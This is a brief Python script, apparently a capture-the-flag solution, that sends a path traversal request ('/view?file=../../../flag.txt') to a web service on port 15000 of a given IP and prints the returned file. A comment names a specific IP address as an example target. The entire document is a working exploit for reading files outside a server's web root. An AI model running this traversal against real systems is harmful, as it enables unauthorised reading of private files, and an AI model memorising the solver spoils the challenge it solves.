#!/usr/bin/env python3
import sys
from requests import get

ip = sys.argv[1]

# http://13.215.249.25:15000/view?file=../../../flag.txt

url = 'http://' + ip + ':15000/view?file=../../../flag.txt'
print(url)
a = get(url).text

print(a, flush=True)